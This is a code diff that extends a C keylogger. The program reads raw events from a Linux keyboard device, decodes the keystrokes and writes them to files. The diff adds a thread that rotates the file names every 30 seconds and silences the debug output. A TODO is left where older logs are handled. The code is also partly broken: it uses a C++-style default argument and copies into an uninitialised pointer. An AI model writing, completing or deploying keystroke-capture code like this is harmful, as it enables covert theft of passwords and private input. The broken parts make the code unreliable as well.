@@ -6,16 +6,29 @@
 #include <linux/input.h>
 #include <fcntl.h>
 #include <pthread.h>
+#include <time.h>
 
 #define KEYBOARDFILE "/dev/input/event2"
-#define FILE "test.dump"
+#define TIMEOUT 30
 
 pthread_mutex_t mut;
 pthread_t th;
 
-char * FILE_NAME = FILE;
+char FILE_NAME[20];
 char stroke[10];
 int size = 0;
+
+void updateFile(int init = 1) {
+    char * last;
+    if (!init) strcpy(last, FILE_NAME);
+    time_t timer = time(NULL);
+    pthread_mutex_lock(&mut);
+    sprintf(FILE_NAME, "%d", timer);
+    pthread_mutex_unlock(&mut);
+    if (!init) {
+        // TODO 
+    }
+}
 
 int storeKeyStroke(char * c, int len) {
     int ret = -1, file = 0;
@@ -25,7 +38,7 @@ int storeKeyStroke(char * c, int len) {
     else if ((ret = write(file, c, len)) < 0)
         perror("Write error"), ret = -1;
     close(file);
-    pthread_mutex_lock(&mut);
+    pthread_mutex_unlock(&mut);
     return ret;
 }
 
@@ -85,20 +98,28 @@ int decode(int code, char * str) {
     return len;
 }
 
+void* update(void * arg) {
+    while (true) {
+        sleep(TIMEOUT);
+        updateFile(0);
+    }
+}
+
 int main() {
     int fd;
     struct input_event ie;
     pthread_mutex_init(&mut,NULL);
 
     int shift = 0;
-
+    updateFile();
+    pthread_create(&th, NULL, update, NULL);
     if((fd = open(KEYBOARDFILE, O_RDONLY)) == -1) {
         perror("Device error");
         exit(EXIT_FAILURE);
     }
     int longstroke = 0;
     while(read(fd, &ie, sizeof(struct input_event))) {
-        printf("time %ld.%06ld\ttype %d\tcode %d\tvalue %d\n", ie.time.tv_sec, ie.time.tv_usec, ie.type, ie.code, ie.value);
+        //printf("time %ld.%06ld\ttype %d\tcode %d\tvalue %d\n", ie.time.tv_sec, ie.time.tv_usec, ie.type, ie.code, ie.value);
         if (ie.type == 1 && ie.value == 1) {
             size = decode(ie.code, stroke);
             if (storeKeyStroke(stroke, size) < 0) {
